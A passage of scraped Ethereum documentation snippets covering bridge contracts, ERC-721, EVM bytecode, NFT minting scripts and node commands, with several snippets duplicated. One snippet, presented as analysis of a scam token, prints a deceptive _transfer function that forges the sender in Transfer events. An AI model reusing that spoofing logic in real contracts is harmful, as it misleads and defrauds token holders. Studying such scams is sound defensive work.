onlyFromCrossDomainAccount(l1TokenBridge) {\n        // Check the target token is compliant and\n        // verify the deposited token on L1 matches the L2 deposited token representation here\n        if (\n            // slither-disable-next-line reentrancy-events\n            ERC165Checker.supportsInterface(_l2Token, 0x1d1d8b63) &&\n            _l1Token == IL2StandardERC20(_l2Token).l1Token()\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Mapping Functions in AssemblyScript\nDESCRIPTION: The mapping.ts file defines functions that transform blockchain events into entities according to the schema. This example shows how to handle new bet events, creating and updating Player and Bet entities as needed.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { Bet, Player } from \"../generated/schema\"\nimport { PlacedBet } from \"../generated/GameContract/GameContract\"\n\nexport function handleNewBet(event: PlacedBet): void {\n  let player = Player.load(event.transaction.from.toHex())\n\n  if (player == null) {\n    // create if doesn't exist yet\n    player = new Player(event.transaction.from.toHex())\n    player.bets = new Array<string>(0)\n    player.totalPlayedCount = 0\n    player.hasWonCount = 0\n    player.hasLostCount = 0\n  }\n\n  let bet = new Bet(\n    event.transaction.hash.toHex() + \"-\" + event.logIndex.toString()\n  )\n  bet.player = player.id\n  bet.playerHasWon = event.params.hasWon\n  bet.time = event.block.timestamp\n  bet.save()\n\n  player.totalPlayedCount++\n  if (event.params.hasWon) {\n    player.hasWonCount++\n  } else {\n    player.hasLostCount++\n  }\n\n  // update array like this\n  let bets = player.bets\n  bets.push(bet.id)\n  player.bets = bets\n\n  player.save()\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH Deposit Functions\nDESCRIPTION: Defines two public functions for depositing ETH to L2: depositETH for sending to the caller's address on L2, and depositETHTo for sending to a specified recipient address on L2. Both wrap the internal _initiateETHDeposit function.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETH(uint32 _l2Gas, bytes calldata _data) external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, _l2Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETHTo(\n        address _to,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external payable {\n        _initiateETHDeposit(msg.sender, _to, _l2Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Função de Planilha para Cálculo de Tamanho de Opcode em EVM Bytecode\nDESCRIPTION: Fórmula para planilha do Google que calcula o tamanho em bytes de cada opcode EVM, considerando os opcodes PUSH que têm tamanho variável baseado no número de bytes a serem enviados à pilha.\n\nLANGUAGE: spreadsheet\nCODE:\n```\n=1+IF(REGEXMATCH(C1,\"PUSH\"),REGEXEXTRACT(C1,\"PUSH(\\d+)\"),0)\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_hashrate en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir le nombre de hachages par seconde avec lesquels le nœud est en train de miner en utilisant la méthode eth_hashrate. Cette méthode peut ne pas être disponible dans certains clients depuis La Fusion.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_hashrate\",\"params\":[],\"id\":71}'\n// Result\n{\n  \"id\":71,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x38a\"\n}\n```\n\n----------------------------------------\n\nTITLE: Solving for Required Gas Price\nDESCRIPTION: Mathematical resolution to find the value of Y (gas price in gwei) needed to fully offset ETH issuance.\n\nLANGUAGE: markdown\nCODE:\n```\n- `Y = (1700(10^9))/(7200 * 15(10^6)) = (17x10^3)/(72 * 15) = 16 gwei` (arrotondando soltanto alle due cifre significative)\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens in Solidity\nDESCRIPTION: Code that calls the pair contract's mint function to issue liquidity tokens to the recipient based on the provided token amounts.\n\nLANGUAGE: solidity\nCODE:\n```\n    liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\n\n----------------------------------------\n\nTITLE: Bridge Restriction and ERC-165 Implementation\nDESCRIPTION: Implementation of access control modifier and ERC-165 interface detection. The onlyL2Bridge modifier ensures that only the bridge can mint or burn tokens, while supportsInterface allows other contracts to detect the supported interfaces.\n\nLANGUAGE: solidity\nCODE:\n```\n\n    modifier onlyL2Bridge() {\n        require(msg.sender == l2Bridge, \"Only L2 Bridge can mint and burn\");\n        _;\n    }\n\n\n    // slither-disable-next-line external-function\n    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {\n        bytes4 firstSupportedInterface = bytes4(keccak256(\"supportsInterface(bytes4)\")); // ERC165\n        bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^\n            IL2StandardERC20.mint.selector ^\n            IL2StandardERC20.burn.selector;\n        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;\n    }\n```\n\n----------------------------------------\n\nTITLE: Invoking onERC721Received in Recipient Contract\nDESCRIPTION: This snippet calls the onERC721Received function on the recipient contract to verify it can handle ERC-721 token transfers. This is a critical safety check to prevent tokens from being lost when sent to contracts.\n\nLANGUAGE: vyper\nCODE:\n```\n        returnValue: bytes32 = ERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data)\n```\n\n----------------------------------------\n\nTITLE: Visualizing Git Branching Strategy for Release-Blocking Bugfixes in Ethereum.org\nDESCRIPTION: ASCII diagram illustrating the Git branch flow when a release-blocking bug is discovered during QA testing, showing how bugfixes are merged into staging and then back to dev.\n\nLANGUAGE: plaintext\nCODE:\n```\nmaster O (tag) - - - - - - - - - - - - - - - - - - - O (tag)\n\n        |                                         /\n\n        |                bugfix O - O           /\n\n        |                     /      \\        /\n\nstaging O - - - - - - - - - O - - - - O - -  O\n\n        |                 /                   \\\n\ndev     O - - - - O - - O - O - - - O - - - - - O\n```\n\n----------------------------------------\n\nTITLE: Lookup Table Key Computation in Function 0x81e580d3\nDESCRIPTION: This section calculates the storage key for the lookup table by hashing 0x04 and adding the calldata input. It demonstrates how dynamic arrays are implemented in storage.\n\nLANGUAGE: evm\nCODE:\n```\n17E | JUMPDEST            | calldataload(4) 0x04 calldataload(4) 0xDA           |\n17F | PUSH1 0x00          | 0x00 calldataload(4) 0x04 calldataload(4) 0xDA      |\n181 | SWAP2               | 0x04 calldataload(4) 0x00 calldataload(4) 0xDA      |\n182 | DUP3                | 0x00 0x04 calldataload(4) 0x00 calldataload(4) 0xDA |\n183 | MSTORE              | calldataload(4) 0x00 calldataload(4) 0xDA           |\n```\n\n----------------------------------------\n\nTITLE: Transferring ERC20 Tokens Between Addresses\nDESCRIPTION: Implements token transfer functionality between addresses. Validates source and destination addresses, updates balances, and emits a Transfer event. Includes checks to prevent transfers to the zero address.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nPUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Initialisieren eines Ethereum-Projektordners\nDESCRIPTION: Bash-Befehle zum Erstellen und Wechseln in einen neuen Projektordner namens 'hello-world' für die Smart-Contract-Entwicklung.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir hello-world\ncd hello-world\n```\n\n----------------------------------------\n\nTITLE: Calculating Block Operation Limit in Ethereum\nDESCRIPTION: This JavaScript snippet shows how Ethereum calculates the operation limit for a new block based on the parent block's limit and operation count. It implements a floating cap mechanism using exponential moving averages to prevent abuse while allowing for network growth.\n\nLANGUAGE: javascript\nCODE:\n```\nblk.oplimit = floor((blk.parent.oplimit \\* (EMAFACTOR - 1) +\nfloor(parent.opcount \\* BLK\\_LIMIT\\_FACTOR)) / EMA\\_FACTOR)\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-721 Constructor in Vyper\nDESCRIPTION: Constructor function for the ERC-721 token contract. It sets up interface support for ERC-165 and ERC-721, and assigns the contract deployer as the minter role.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: Simple Storage Contract Example in Serpent for Ethereum\nDESCRIPTION: A basic Serpent contract that stores a value at a specific index in the contract's storage if that index is empty. The code checks if a storage location is unused, and if so, stores a provided value at that location.\n\nLANGUAGE: python\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: ERC-721 Internal Transfer Implementation in Vyper\nDESCRIPTION: The core internal implementation of token transfer with all necessary checks and state updates, used by both regular and safe transfer functions.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Configuration initiale pour frapper un NFT avec Web3\nDESCRIPTION: Configuration de base pour un script de frappe de NFT, incluant la configuration des variables d'environnement et l'initialisation de l'instance Alchemy Web3.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit from L1 to L2 in Ethereum Bridge\nDESCRIPTION: This internal function handles the logic for depositing ETH from L1 to L2. It constructs a message to call the finalizeDeposit function on L2, sends the cross-domain message, and emits an event to notify listeners of the deposit.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n    \n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    \n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Lighthouse Consensus Client Logs\nDESCRIPTION: Command to view the logs of the Lighthouse beacon node service to verify it's running correctly and syncing with the Ethereum beacon chain.\n\nLANGUAGE: sh\nCODE:\n```\nsudo journalctl -u lighthouse-beacon\n```\n\n----------------------------------------\n\nTITLE: Analyzing Deceptive _transfer Function in wARB Token\nDESCRIPTION: This code shows the deceptive _transfer function in the scam token that alters the sender address in Transfer events when the sender is the contract owner, making transactions appear to come from the deployer address.\n\nLANGUAGE: solidity\nCODE:\n```\n    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        if (sender == contract_owner){\n            sender = deployer;\n        }\n        emit Transfer(sender, recipient, amount);\n    }\n```\n\n----------------------------------------\n\nTITLE: Checking Contract Receiving Capability in ERC-721 Safe Transfer\nDESCRIPTION: This code checks if the receiving address is a contract and if so, calls onERC721Received to verify it can handle ERC-721 tokens. This is part of the safeTransferFrom implementation.\n\nLANGUAGE: python\nCODE:\n```\nif _to.is_contract: # check if `_to` is a contract address\n```\n\n----------------------------------------\n\nTITLE: Testing Short Calldata Handling in Solidity Cache Contract\nDESCRIPTION: Function that tests how the cache contract handles insufficient parameters in the calldata. It verifies that the call fails when the provided calldata is too short, returning false as expected.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction testShortCalldata() public {\n        .\n        .\n        .\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, false);\n    }   // testShortCalldata\n```\n\n----------------------------------------\n\nTITLE: Querying Average Gas Limit per Block in Ethereum\nDESCRIPTION: SQL query that retrieves the daily average gas limit per block from 2016 onwards. The gas limit represents the maximum amount of computational work that can be included in each Ethereum block.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_limit) AS avg_block_gas_limit\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration for Gas Estimation\nDESCRIPTION: YAML configuration enabling gas consumption estimation and limiting sequence length to make results more manageable.\n\nLANGUAGE: yaml\nCODE:\n```\nestimateGas: true\n```\n\nLANGUAGE: yaml\nCODE:\n```\nseqLen: 2\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Importing and Using connectWallet in a React Component\nDESCRIPTION: This code shows how to import the connectWallet function and set up a React component with state variables for wallet integration. It demonstrates the component's initial structure with useState hooks for wallet address, status, and NFT metadata.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\";\nimport { connectWallet } from \"./utils/interact.js\";\n\nconst Minter = (props) => {\n\n  //State variables\n  const [walletAddress, setWallet] = useState(\"\");\n  const [status, setStatus] = useState(\"\");\n  const [name, setName] = useState(\"\");\n  const [description, setDescription] = useState(\"\");\n  const [url, setURL] = useState(\"\");\n```\n\n----------------------------------------\n\nTITLE: Testing Transaction Reversion with Waffle\nDESCRIPTION: Test that verifies the split function reverts with the expected error message when an uneven wei amount is provided using Waffle's revertedWith matcher.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Reverts when Vei amount uneven\", async () => {\n  await expect(splitter.split({ value: 51 })).to.be.revertedWith(\n    \"Uneven wei amount not allowed\"\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit from L1 to L2 in Solidity\nDESCRIPTION: This function handles the process of depositing ETH from L1 to L2. It creates a message to call finalizeDeposit on the L2 token bridge with the appropriate parameters and sends it via the cross-domain messenger.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing decreaseAllowance Function in Solidity for ERC-20 Tokens\nDESCRIPTION: This function atomically decreases the allowance granted to a spender by the caller. Like increaseAllowance, it prevents front-running attacks. It uses safe subtraction to prevent underflow and ensures the spender has sufficient allowance for the reduction.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Atomically decreases the allowance granted to `spender` by the caller.\n *\n * This is an alternative to {approve} that can be used as a mitigation for\n * problems described in {IERC20-approve}.\n *\n * Emits an {Approval} event indicating the updated allowance.\n *\n * Requirements:\n *\n * - `spender` cannot be the zero address.\n * - `spender` must have allowance for the caller of at least\n * `subtractedValue`.\n */\nfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue,\n            \"ERC20: decreased allowance below zero\"));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Cache Size Arrays in Plaintext\nDESCRIPTION: Two arrays of numeric values representing memory addresses and cache sizes in bytes. The first unnamed array contains sequentially increasing memory addresses or block sizes, while the second array named 'cache_sizes' contains progressive cache size values.\n\nLANGUAGE: plaintext\nCODE:\n```\n14453569664, 14461959808, 14470347904, 14478737024, 14487122816,\n14495511424, 14503901824, 14512291712, 14520677504, 14529064832,\n14537456768, 14545845632, 14554234496, 14562618496, 14571011456,\n14579398784, 14587789184, 14596172672, 14604564608, 14612953984,\n14621341312, 14629724288, 14638120832, 14646503296, 14654897536,\n14663284864, 14671675264, 14680061056, 14688447616, 14696835968,\n14705228416, 14713616768, 14722003328, 14730392192, 14738784128,\n14747172736, 14755561088, 14763947648, 14772336512, 14780725376,\n14789110144, 14797499776, 14805892736, 14814276992, 14822670208,\n14831056256, 14839444352, 14847836032, 14856222848, 14864612992,\n14872997504, 14881388672, 14889775744, 14898165376, 14906553472,\n14914944896, 14923329664, 14931721856, 14940109696, 14948497024,\n14956887424, 14965276544, 14973663616, 14982053248, 14990439808,\n14998830976, 15007216768, 15015605888, 15023995264, 15032385152,\n15040768384, 15049154944, 15057549184, 15065939072, 15074328448,\n15082715008, 15091104128, 15099493504, 15107879296, 15116269184,\n15124659584, 15133042304, 15141431936, 15149824384, 15158214272,\n15166602368, 15174991232, 15183378304, 15191760512, 15200154496,\n15208542592, 15216931712, 15225323392, 15233708416, 15242098048,\n15250489216, 15258875264, 15267265408, 15275654528, 15284043136,\n15292431488, 15300819584, 15309208192, 15317596544, 15325986176,\n15334374784, 15342763648, 15351151744, 15359540608, 15367929728,\n15376318336, 15384706432, 15393092992, 15401481856, 15409869952,\n15418258816, 15426649984, 15435037568, 15443425664, 15451815296,\n15460203392, 15468589184, 15476979328, 15485369216, 15493755776,\n15502146944, 15510534272, 15518924416, 15527311232, 15535699072,\n15544089472, 15552478336, 15560866688, 15569254528, 15577642624,\n15586031488, 15594419072, 15602809472, 15611199104, 15619586432,\n15627975296, 15636364928, 15644753792, 15653141888, 15661529216,\n15669918848, 15678305152, 15686696576, 15695083136, 15703474048,\n15711861632, 15720251264, 15728636288, 15737027456, 15745417088,\n15753804928, 15762194048, 15770582656, 15778971008, 15787358336,\n15795747712, 15804132224, 15812523392, 15820909696, 15829300096,\n15837691264, 15846071936, 15854466944, 15862855808, 15871244672,\n15879634816, 15888020608, 15896409728, 15904799104, 15913185152,\n15921577088, 15929966464, 15938354816, 15946743424, 15955129472,\n15963519872, 15971907968, 15980296064, 15988684928, 15997073024,\n16005460864, 16013851264, 16022241152, 16030629248, 16039012736,\n16047406976, 16055794816, 16064181376, 16072571264, 16080957824,\n16089346688, 16097737856, 16106125184, 16114514816, 16122904192,\n16131292544, 16139678848, 16148066944, 16156453504, 16164839552,\n16173236096, 16181623424, 16190012032, 16198401152, 16206790528,\n16215177344, 16223567744, 16231956352, 16240344704, 16248731008,\n16257117824, 16265504384, 16273898624, 16282281856, 16290668672,\n16299064192, 16307449216, 16315842176, 16324230016, 16332613504,\n16341006464, 16349394304, 16357783168, 16366172288, 16374561664,\n16382951296, 16391337856, 16399726208, 16408116352, 16416505472,\n16424892032, 16433282176, 16441668224, 16450058624, 16458448768,\n16466836864, 16475224448, 16483613056, 16492001408, 16500391808,\n16508779648, 16517166976, 16525555328, 16533944192, 16542330752,\n16550719616, 16559110528, 16567497088, 16575888512, 16584274816,\n16592665472, 16601051008, 16609442944, 16617832064, 16626218624,\n16634607488, 16642996096, 16651385728, 16659773824, 16668163712,\n16676552576, 16684938112, 16693328768, 16701718144, 16710095488,\n16718492288, 16726883968, 16735272832, 16743661184, 16752049792,\n16760436608, 16768827008, 16777214336, 16785599104, 16793992832,\n16802381696, 16810768768, 16819151744, 16827542656, 16835934848,\n16844323712, 16852711552, 16861101952, 16869489536, 16877876864,\n16886265728, 16894653056, 16903044736, 16911431296, 16919821696,\n16928207488, 16936592768, 16944987776, 16953375616, 16961763968,\n16970152832, 16978540928, 16986929536, 16995319168, 17003704448,\n17012096896, 17020481152, 17028870784, 17037262208, 17045649536,\n17054039936, 17062426496, 17070814336, 17079205504, 17087592064,\n17095978112, 17104369024, 17112759424, 17121147776, 17129536384,\n17137926016, 17146314368, 17154700928, 17163089792, 17171480192,\n17179864192, 17188256896, 17196644992, 17205033856, 17213423488,\n17221811072, 17230198912, 17238588032, 17246976896, 17255360384,\n17263754624, 17272143232, 17280530048, 17288918912, 17297309312,\n17305696384, 17314085504, 17322475136, 17330863744, 17339252096,\n17347640192, 17356026496, 17364413824, 17372796544, 17381190016,\n17389583488, 17397972608, 17406360704, 17414748544, 17423135872,\n17431527296, 17439915904, 17448303232, 17456691584, 17465081728,\n17473468288, 17481857408, 17490247552, 17498635904, 17507022464,\n17515409024, 17523801728, 17532189824, 17540577664, 17548966016,\n17557353344, 17565741184, 17574131584, 17582519168, 17590907008,\n17599296128, 17607687808, 17616076672, 17624455808, 17632852352,\n17641238656, 17649630848, 17658018944, 17666403968, 17674794112,\n17683178368, 17691573376, 17699962496, 17708350592, 17716739968,\n17725126528, 17733517184, 17741898112, 17750293888, 17758673024,\n17767070336, 17775458432, 17783848832, 17792236928, 17800625536,\n17809012352, 17817402752, 17825785984, 17834178944, 17842563968,\n17850955648, 17859344512, 17867732864, 17876119424, 17884511872,\n17892900224, 17901287296, 17909677696, 17918058112, 17926451072,\n17934843776, 17943230848, 17951609216, 17960008576, 17968397696,\n17976784256, 17985175424, 17993564032, 18001952128, 18010339712,\n18018728576, 18027116672, 18035503232, 18043894144, 18052283264,\n18060672128, 18069056384, 18077449856, 18085837184, 18094225792,\n18102613376, 18111004544, 18119388544, 18127781248, 18136170368,\n18144558976, 18152947328, 18161336192, 18169724288, 18178108544,\n18186498944, 18194886784, 18203275648, 18211666048, 18220048768,\n18228444544, 18236833408, 18245220736]\n```\n\n----------------------------------------\n\nTITLE: Creating a Hardhat Deployment Script for NFT Contract in JavaScript\nDESCRIPTION: A script that deploys an NFT smart contract to the Ethereum network using Hardhat and ethers.js. It creates a contract factory for the MyNFT contract, deploys it, and logs the contract address to the console upon successful deployment.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const MyNFT = await ethers.getContractFactory(\"MyNFT\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const myNFT = await MyNFT.deploy()\n  await myNFT.deployed()\n  console.log(\"Contract deployed to address:\", myNFT.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: Implementing pinJSONToIPFS Function with Axios for Pinata API\nDESCRIPTION: Complete implementation of the pinJSONToIPFS function that uses Axios to make POST requests to Pinata's API, enabling JSON metadata to be pinned to IPFS. The function handles both successful and failed requests, returning appropriate responses.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n\nconst axios = require(\"axios\")\n\nexport const pinJSONToIPFS = async (JSONBody) => {\n  const url = `https://api.pinata.cloud/pinning/pinJSONToIPFS`\n  //making axios POST request to Pinata ⬇️\n  return axios\n    .post(url, JSONBody, {\n      headers: {\n        pinata_api_key: key,\n        pinata_secret_api_key: secret,\n      },\n    })\n    .then(function (response) {\n      return {\n        success: true,\n        pinataUrl:\n          \"https://gateway.pinata.cloud/ipfs/\" + response.data.IpfsHash,\n      }\n    })\n    .catch(function (error) {\n      console.log(error)\n      return {\n        success: false,\n        message: error.message,\n      }\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit from L1 to L2 in Solidity\nDESCRIPTION: This function handles the process of depositing ETH from L1 to L2. It creates a message to call finalizeDeposit on the L2 token bridge with the appropriate parameters and sends it via the cross-domain messenger.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Finalizing ERC20 Withdrawal from L2 to L1 in Solidity\nDESCRIPTION: This function processes ERC20 token withdrawals coming from L2. It can only be called by the cross-domain messenger with a message originating from the L2 token bridge. It updates deposit accounting, transfers tokens to the recipient, and emits an event.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction finalizeERC20Withdrawal(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    bytes calldata _data\n) external onlyFromCrossDomainAccount(l2TokenBridge) {\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;\n\n    // When a withdrawal is finalized on L1, the L1 Bridge transfers the funds to the withdrawer\n    // slither-disable-next-line reentrancy-events\n    IERC20(_l1Token).safeTransfer(_to, _amount);\n\n    // slither-disable-next-line reentrancy-events\n    emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Pair Tracking State Variables in Uniswap V2 Factory\nDESCRIPTION: Declaration of state variables that track exchange pairs. The getPair mapping identifies a pair exchange contract by the two ERC-20 token addresses, while allPairs array stores all pair exchange addresses created by this factory.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping(address => mapping(address => address)) public getPair;\n    address[] public allPairs;\n```\n\n----------------------------------------\n\nTITLE: Simulating Deposit Effects in ERC-4626 Vault\nDESCRIPTION: The previewDeposit function allows users to simulate the effects of their deposit at the current block, showing how many shares they would receive for depositing a specific amount of assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewDeposit(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Initiating ETH Deposit from L1 to L2 in Solidity\nDESCRIPTION: Implementation of the internal function that handles ETH deposits from L1 to L2. It constructs a cross-domain message containing the deposit details and sends it to the L2 token bridge for processing.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateETHDeposit(\n    address _from,\n    address _to,\n    uint32 _l2Gas,\n    bytes memory _data\n) internal {\n    // Construct calldata for finalizeDeposit call\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        address(0),\n        Lib_PredeployAddresses.OVM_ETH,\n        _from,\n        _to,\n        msg.value,\n        _data\n    );\n\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n    // slither-disable-next-line reentrancy-events\n    emit ETHDepositInitiated(_from, _to, msg.value, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Manticore Workspace Directory\nDESCRIPTION: Shows how to access the workspace directory where Manticore stores all generated files and analysis results.\n\nLANGUAGE: python\nCODE:\n```\nprint(\"Results are in {}\".format(m.workspace))\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode in EVM (F3)\nDESCRIPTION: The RETURN opcode (F3) returns data from memory to the caller. It takes offset and length as parameters and returns the memory slice specified.\n\nLANGUAGE: evm\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Withdrawal Implementation for L2StandardBridge in Solidity\nDESCRIPTION: Internal function that handles the withdrawal logic, including burning the L2 tokens and sending a cross-domain message to the L1 bridge to release the corresponding tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Performs the logic for withdrawals by burning the token and informing\n     *      the L1 token Gateway of the withdrawal.\n     * @param _l2Token Address of L2 